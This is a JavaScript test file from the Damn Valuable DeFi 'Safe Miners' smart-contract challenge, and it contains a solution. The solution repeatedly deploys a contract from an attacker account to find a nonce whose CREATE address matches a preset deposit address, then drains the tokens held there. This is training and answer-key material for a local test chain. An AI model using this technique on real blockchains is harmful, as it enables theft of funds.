const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Safe Miners', function () {
    let deployer, attacker;

    const DEPOSIT_TOKEN_AMOUNT = ethers.utils.parseEther('2000042');
    const DEPOSIT_ADDRESS = '0x79658d35aB5c38B6b988C23D02e0410A380B8D5c';

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deposit the DVT tokens to the address
        await this.token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are correctly set
        expect(await this.token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await this.token.balanceOf(attacker.address)).eq('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        /**
         * This challenge is more of a guess-work
         * 
         * We just get lucky that the attacker address here, when used with a specific nonce, can deploy a smart contract, which in turn when used with another specific nonce, can deploy another smart contract exactly our target address.
         * 
         * If the final smart contract contains code that transfers the attacker all tokens, then the challenge is solved.
         * 
         * This solution relies on the face that `CREATE` results in smart contract addresses that depend only on deployer address and an incrementing nonce.
         */

        const maxNonce = 100;

        // Deploy MissileLauncher contract
        const missileLauncherFactory = await ethers.getContractFactory("MissileLauncher");

        let i = 0;
        for (; i < maxNonce; i++) {
            await missileLauncherFactory.connect(attacker).deploy(
                maxNonce,
                this.token.address,
                DEPOSIT_ADDRESS
            );
            if ((await this.token.balanceOf(attacker.address)).gt(0)) {
                break;
            }
        }
        console.log(`Attacker nonce: ${i}`);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        // The attacker took all tokens available in the deposit address
        expect(
            await this.token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(DEPOSIT_TOKEN_AMOUNT);
    });

    /////////////////////////
    // HELPERS //////////////
    /////////////////////////

    function calculateCreate2AddressFromSalt(missileLauncherContractAddr, salt, missileLauncherContractBytecodeHash) {
        return ethers.utils.getCreate2Address(
            missileLauncherContractAddr,
            salt,
            missileLauncherContractBytecodeHash
        );
    }
});
